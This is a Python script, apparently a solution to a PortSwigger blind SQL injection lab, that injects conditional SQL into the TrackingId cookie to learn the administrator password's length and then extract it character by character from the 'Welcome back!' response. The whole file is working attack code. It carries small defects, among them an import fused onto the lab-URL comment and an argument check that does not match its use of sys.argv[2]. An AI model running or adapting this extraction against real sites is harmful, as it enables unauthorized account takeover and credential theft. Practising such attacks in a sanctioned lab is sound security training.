# Created by sm6r, 2024
# Lab:  https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responsesfrom re import ASCII
import requests
import sys
import string

MIN_PASS_LENGTH = 10
MAX_PASS_LENGTH = 30
PASS_CHARS = string.ascii_lowercase + string.digits
RESULT = []
if len(sys.argv) < 2:
    print("usage: solution.py $URL$ verbose={1,0}")
    exit()

if sys.argv[2] =="1":
    def printV(inject):
        print(inject)
else:
    def printV(inject):
        pass


URL = sys.argv[1]

def getPassLenth(trackingCookie):
    printV("-- PASSWD LENGTH: ")
    for i in range(MIN_PASS_LENGTH,MAX_PASS_LENGTH,1):
        inject = trackingCookie+"' AND (SELECT LENGTH(password) FROM users WHERE username='administrator') != "+str(i)+" --"
        printV(inject)
        resp = requests.get(URL,cookies={"TrackingId":inject})

        if resp.text.find("Gateway Timeout") != -1:
            print("Invalid URL")
            exit()

        if resp.text.find("Welcome back!") == -1:
            print(f"Password length is: {i}\n")
            return i

    return 0

def getChar(trackingCookie,offset):
    for i in PASS_CHARS:
        inject = trackingCookie+f"' AND (SELECT SUBSTRING(password,{offset},1) FROM users WHERE username='administrator' )= '"+i
        printV(inject)
        resp = requests.get(URL,cookies={"TrackingId":inject})

        if resp.text.find("Gateway Timeout") != -1:
            print("Invalid URL")
            exit()

        if resp.text.find("Welcome back!") != -1:
            print(f"PASSWD[{offset}] is {i}")
            return i


def main():
    resp = requests.get(URL)
    cookie = resp.cookies['TrackingId']
    pass_length = getPassLenth(cookie)

    for i in range(1,pass_length+1):
        printV(f"\n---- OFFSET {i}")
        RESULT.append(getChar(cookie,i))


    print("ATTACK DONE SUCCESSFULLY\nRESULT IS: "+''.join(RESULT))

if __name__ == "__main__":
    main()


